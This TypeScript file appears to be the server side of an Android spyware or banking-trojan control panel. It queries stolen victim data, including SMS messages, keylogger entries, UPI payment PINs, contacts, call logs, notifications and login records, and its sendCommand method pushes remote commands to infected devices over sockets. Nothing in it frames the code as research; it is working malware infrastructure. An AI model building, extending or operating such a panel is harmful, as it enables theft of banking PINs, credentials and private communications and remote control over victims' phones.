import { createClient } from '@supabase/supabase-js';
import config from '../config/env';
import { IDeviceProvider, DeviceStats } from './base';
import { io } from '../index';

export class SupabaseProvider implements IDeviceProvider {
    private supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);
    private appId?: string;

    constructor(appId?: string) {
        this.appId = appId;
    }

    async listDevices(limit: number = 100): Promise<any[]> {
        let query = this.supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false })
            .limit(limit);

        if (this.appId) {
            query = query.eq('app_id', this.appId);
        }

        const { data, error } = await query;
        if (error) throw error;

        const devices = data || [];
        return devices.map(device => ({ ...device, _sourceProvider: 'SUPABASE' }));
    }

    async getDevice(deviceId: string): Promise<any> {
        const { data, error } = await this.supabase
            .from('devices')
            .select('*')
            .eq('device_id', deviceId)
            .maybeSingle();

        if (error) throw error;

        // Ensure appId is correctly set for assessment
        if (data) {
            return {
                ...data,
                app_id: this.appId || data.app_id,
                _sourceProvider: 'SUPABASE'
            };
        }

        return data;
    }

    async getDeviceStats(deviceId: string): Promise<DeviceStats> {
        const [msgCount, appCount] = await Promise.all([
            this.supabase.from('sms_messages').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
            this.supabase.from('installed_apps').select('*', { count: 'exact', head: true }).eq('device_id', deviceId)
        ]);

        return {
            messages: msgCount.count || 0,
            apps: appCount.count || 0
        };
    }

    async getMessages(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('sms_messages')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getApps(deviceId: string, limit: number = 200): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('installed_apps')
            .select('*')
            .eq('device_id', deviceId)
            .order('app_name', { ascending: true })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getKeylogs(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('key_logger')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getUpiPins(deviceId: string): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('upi_pins')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false });

        if (error) throw error;
        return data || [];
    }

    async getHeartbeat(deviceId: string, limit: number = 50): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('heartbeat')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getSims(deviceId: string): Promise<any[]> {
        // Sims are usually embedded in the device object in this project
        const device = await this.getDevice(deviceId);
        return device?.sims || [];
    }

    async getNotifications(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('notifications')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) return []; // Table might not exist
        return data || [];
    }

    async getCallLogs(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('call_logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) return [];
        return data || [];
    }

    async getContacts(deviceId: string): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('contacts')
            .select('*')
            .eq('device_id', deviceId)
            .order('name', { ascending: true });
        if (error) return [];
        return data || [];
    }

    async getLogins(deviceId: string): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('login_records')
            .select('*')
            .eq('linked_device_id', deviceId)
            .order('created_at', { ascending: false });
        if (error) return [];
        return data || [];
    }

    async sendCommand(deviceId: string, command: string, payload: any): Promise<any> {
        const { data: cmd, error } = await this.supabase
            .from('device_commands')
            .insert([{
                device_id: deviceId,
                command,
                payload: payload || null,
                status: 'pending',
            }])
            .select()
            .single();

        if (error) throw error;

        // Emit to socket
        const commandForDevice = {
            id: cmd.id,
            deviceId: cmd.device_id,
            command: cmd.command,
            payload: cmd.payload,
            status: cmd.status
        };

        const deviceRooms = [`device:${deviceId}`, `device-${deviceId}`];
        deviceRooms.forEach(room => {
            io.to(room).emit('command', JSON.stringify([commandForDevice]));
            io.to(room).emit('new_command', { command: cmd });
        });

        return cmd;
    }

    async listAllMessages(limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('sms_messages')
            .select('*')
            .order('timestamp', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }

    async listAllApps(limit: number = 200): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('installed_apps')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }

    async listAllKeylogs(limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('key_logger')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }

    async listAllUpiPins(limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('upi_pins')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }
}
